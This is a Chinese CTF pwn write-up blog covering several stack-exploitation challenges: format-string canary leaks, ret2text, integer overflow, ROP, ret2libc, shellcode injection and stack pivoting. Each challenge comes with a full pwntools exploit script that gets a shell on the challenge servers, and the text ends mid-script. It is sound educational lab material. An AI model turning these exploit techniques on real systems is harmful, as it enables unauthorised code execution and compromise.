<p>可以看出canary距离为2的地方存放了main的地址，那么减去main函数在ida里的地址（pie保护），再减去偏移量，就可以得到程序的基址了。（也可以看main函数中mov eax，0的位置的地址是多少。）</p>
<p>同时程序win函数中存放了shell，所以后面用ret2text的做法就可以getshell了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez_fmt&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">20932</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl1 = <span class="string">b&#x27;%23$paa%25$p&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;1st input: &#x27;</span>,pl1)</span><br><span class="line"><span class="comment">#canary = u64(io.recvuntil(b&#x27;\x7f&#x27;)[:-6].rjust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pro_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">97</span> - <span class="number">0x12fa</span></span><br><span class="line">success(<span class="built_in">hex</span>(pro_base))</span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;win&#x27;</span>] + pro_base</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">ret = <span class="number">0x12f9</span> + pro_base</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(backdoor)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;2nd input: &#x27;</span>,pl2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-EZ2048"><a href="#3-EZ2048" class="headerlink" title="3.EZ2048"></a>3.EZ2048</h2><p>一道非常有意思的题目🤔。</p>
<p><img src="/images/is3-1.png" alt="main"></p>
<p>具体的代码不完全展示了。基本逻辑就是通过2048来获取分数，满足100000分后可以进入shell函数。这里的漏洞点在整型溢出。由于有有符号数转无符号数的代码，所以当有符号数为-1等数的时候，转为无符号数是极大值。由于这里一开始给我们50分，结束一局扣10分。所以可以通过连续推出6局来使分数达到-10转成一个大于100000的分数，从而成功进入shell函数。</p>
<p><img src="/images/is3-2.png" alt="shell"></p>
<p>可以看到这里的shell函数只会执行一个ls的命令，还有一个exit的命令。同时还存在canary。所以第一个想法是先泄露canary。canary在buf[17]的位置上，也就是前面有17个元素。qword是8字节，所以padding&#x3D;17*8&#x3D;136。由于printf截断\x00输出的缘故，所以再填充一个junk，将canary顺势输出。</p>
<p>再结合前面main函数，让你输入名字的地方，发现buf的位置正好是bss段。所以可以写入&#x2F;bin&#x2F;sh，最后再回到地址0x404a40来实现getshell。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez2048&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">23145</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez2048&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404a46</span></span><br><span class="line">sys = <span class="number">0x401170</span></span><br><span class="line">ret = <span class="number">0x4027ea</span></span><br><span class="line">rdi = <span class="number">0x40133e</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;game&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;your score:&#x27;</span>)</span><br><span class="line">    score = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> score&lt;<span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>) </span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">success(<span class="string">f&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里解释一下exp。</p>
<p>bss地址为什么要偏移6。</p>
<p>可以看一下源代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, dest);</span><br></pre></td></tr></table></figure>

<p>所以可以看出来，hello和我们输入的内容拼接在一起，并且写到了bss段上。（可以通过gdb动调看出。）</p>
<p>最后为什么要发送exit。</p>
<p>因为我们构造的执行流是需要到shell函数的结束的时候才会执行。而这里存在两个死循环，所以我们需要主动打破最外层的循环来使程序执行我们构造的恶意代码。</p>
<h2 id="4-Ret2rop"><a href="#4-Ret2rop" class="headerlink" title="4.Ret2rop"></a>4.Ret2rop</h2><p>这道题为我们展示了ret2text的做法，也很有意思。</p>
<p><img src="/images/is4-1.png" alt="ida"></p>
<p>这是vuln函数的伪代码，可以看出，这里还是有一个需要你输入姓名的代码。那么结合一下上面一道题，我们可以看出来还是需要往name（bss段）内填入&#x2F;bin&#x2F;sh。</p>
<p>这里需要注意的点。</p>
<p><img src="/images/is4-2.png" alt="frame"></p>
<p>1.frame是一个结构体，里面的成员有buf和mask。可以把buf和mask理解为数组，各自含有32个元素。</p>
<p>2.观察vuln函数发现，这里有一个xor异或保护。可以知道一个数与0异或，其值不变。所以我们可以在我们构造的rop链的后面填入大量的\x00来保证我们的rop链成功执行。</p>
<p>可以看出是buf[i]^mask[i]，并且把最后的结果写入到buf[i]中。所以两者之间的offset&#x3D;0x20。</p>
<p><img src="/images/is4-3.png" alt="stack"></p>
<p>可以根据图来看栈上的基本结构。所以这里的rop会与0x20个0进行异或。由于要保证这里的0x20为0，所以往后多填充了一些0，来使0x20处的0值不变。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2rop&#x27;</span>)</span><br><span class="line">pop_rsi = <span class="number">0x401a1c</span></span><br><span class="line">mov_rdi_rsi = <span class="number">0x401a25</span></span><br><span class="line">ret = <span class="number">0x4015b0</span></span><br><span class="line">bss = <span class="number">0x4040f0</span></span><br><span class="line">sys = <span class="number">0x401180</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;demo&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pl = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x58</span> + p64(pop_rsi) + p64(bss) + p64(mov_rdi_rsi) + p64(sys) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;yourself&#x27;</span>) </span><br><span class="line">io.send(pl)</span><br><span class="line">                                                                        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h2><p><img src="/images/is5-1.png" alt="vuln"></p>
<p><img src="/images/is5-2.png" alt="checksec"></p>
<p>可以看出这里开了canary保护，所以我们要写泄露出canary。vuln函数可以看出 ，给了很多溢出的空间。所以可以填充canary的最高位字节，就可以把canary泄露出来了。然后后面就可以按照ret2libc去做了。不过这里没有pop rdi，那我们又该怎么泄露libc_base呢？</p>
<p>进gdb调试，可以看见，当我们运行到vuln函数ret前，可以看到rdi的地址内存放着funlockfile的地址。那此时调用 puts_plt就可以把rdi存放的内容打印出来了 。</p>
<p><img src="/images/is5-3.png" alt="gdb"></p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> *  <span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name &gt;&gt;&#x27;</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(elf.plt.puts) + p64(vuln)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content &gt;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.funlockfile</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">rdi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line">ret = <span class="number">0x401493</span></span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name &gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content &gt;&gt;&#x27;</span>)</span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>RDCTF</title>
    <url>/2026/01/20/RDCTF/</url>
    <content><![CDATA[<h1 id="RDCTF"><a href="#RDCTF" class="headerlink" title="RDCTF"></a>RDCTF</h1><h2 id="1-Ret2text"><a href="#1-Ret2text" class="headerlink" title="1.Ret2text"></a>1.Ret2text</h2><p>简单的pwn的入门题。</p>
<p>func函数里有read函数的栈溢出，溢出字节大小为0x20。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;you may be forgot something~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">30120</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">backdoor = <span class="number">0x401269</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;input:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的backdoor的地址指向的是下面的汇编指令，这样就可以避免了堆栈平衡的因素。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rax, command    ; &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>

<p>当然pl也可以写成下面这样。这样就是padding + ret + backdoor，考虑堆栈平衡的写法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x40127a</span>) + p64(<span class="number">0x401261</span>)</span><br></pre></td></tr></table></figure>



<h2 id="2-Ret2sh"><a href="#2-Ret2sh" class="headerlink" title="2.Ret2sh"></a>2.Ret2sh</h2><p>和上面一题其实是差不多的。</p>
<p>不过这里没单独给&#x2F;bin&#x2F;sh的形式。不过向system函数里传入sh,$0的参数也是可以成功getshell的。</p>
<p>进gdb调试elf文件，输入search sh可以得到sh的地址为：0x402041。所以可以通过rdi传参来getshell。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">31290</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(<span class="number">0x402041</span>) + p64(<span class="number">0x401264</span>)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bin!&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>当然还有一种做法，应该是非预期了，因为有些繁琐了。这里的read函数给出的溢出范围较大，所以可以直接按照ret2libc的打法去做。这里就不具体展开了。<br>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin!&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(elf.got.read) + p64(elf.plt.puts) + p64(elf.sym.RDCTF)</span><br><span class="line">io.send(pl1)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x114840</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + <span class="number">0x50d70</span></span><br><span class="line">binsh = base + <span class="number">0x1d8678</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(binsh) + p64(rdi+<span class="number">1</span>) + p64(sys)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里base的求法是不一样的，具体情况得根据远端实际的版本来判断，因为这里没有提供libc.so.6，所以各个函数的偏移量是不知道的，所以说是非预期。</p>
<h2 id="3-Pwn"><a href="#3-Pwn" class="headerlink" title="3.Pwn!!"></a>3.Pwn!!</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [esp+68h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 nbytes; <span class="comment">// [esp+6Eh] [ebp-Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;let me check you:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;remember no more than 10!!!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n10);</span><br><span class="line">  nbytes = n10;</span><br><span class="line">  <span class="keyword">if</span> ( n10 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m furious, and I&#x27;m going to destroy the whole world!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;yeye... this is a gift you: %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please come close to me:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看出我们输入的n10的值，就是后面我们read能读入的最大字节数。这里做了限制只能读入10个字节，那肯定是不够我们经行利用的。不过这里还做了转换，即nbytes＝n10。而nbytes又是个无符号数。所以这里存在整型溢出。只要我们输入-1就可以转化成32位程序的INT_MAX。</p>
<p>后面又给了我们输入的首地址。所以可以通过调用system函数传参&#x2F;bin&#x2F;sh来getshell。但是这里又没有system函数。所以可以输入shellcode来getshell。下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;api.wdsec.com.cn&#x27;</span>,<span class="number">31998</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;10!!!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">pl = shell</span><br><span class="line">pl = pl.ljust(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(stack)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="4-灵魂舞步"><a href="#4-灵魂舞步" class="headerlink" title="4.灵魂舞步"></a>4.灵魂舞步</h2><p>保护情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/RDCTF/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>首先是进行一个RDCTF函数的检测。只有这个函数通过以后才会进入secret函数，也就是漏洞函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">RDCTF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+4h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand() % <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Round %d: What is the secret number? &quot;</span>, i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v3 = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong number, try again later.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;All ten guesses correct. i will give you my serect\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，就是伪随机数。我们只需要去撞时间戳就行。所以可以引入ctypes库来绕过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们来看一下secret函数里做了什么。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">serect</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i love you&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wait wait,what do you want to do? %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Nothing here ,%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里存在栈溢出，不过溢出字节只有0x10。那么很正常的可以想到栈迁移的手法来打。</p>
<p>我们进gdb调试一下。</p>
<p><img src="/images/RDCTF.png" alt="gdb"></p>
<p>可以看出，当我们把0x30的地址都覆盖了以后，可以泄露出一处栈地址。那么我们就可以打栈上栈迁移了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;api.wdsec.com.cn&#x27;,31191)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc.srand(libc.time(0))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line"><span class="comment">#io.sendline()</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;i love you\n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(<span class="number">0x080493C5</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">_=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">stack=u32(io.recv(<span class="number">4</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span 